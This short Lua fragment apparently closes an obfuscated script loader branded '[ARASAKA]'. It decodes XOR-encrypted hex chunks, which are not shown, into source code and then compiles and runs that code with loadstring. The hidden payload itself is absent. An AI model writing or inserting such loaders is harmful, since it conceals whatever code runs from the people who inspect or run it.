local decode = {}
for _, chunk in ipairs(chunks) do
    for i = 1, #chunk, 2 do
        local b = tonumber(string.sub(chunk, i, i + 1), 16)
        if not b then error("[ARASAKA] Payload XOR-HEX invalido.") end
        decode[#decode + 1] = string.char(bit32.bxor(b, 93))
    end
end
local source = table.concat(decode)
local compile, compileError = loadstring(source)
if not compile then error("[ARASAKA] Falha ao compilar payload: " .. tostring(compileError)) end
local ok, result = pcall(compile)
if not ok then error("[ARASAKA] Falha na execucao: " .. tostring(result)) end
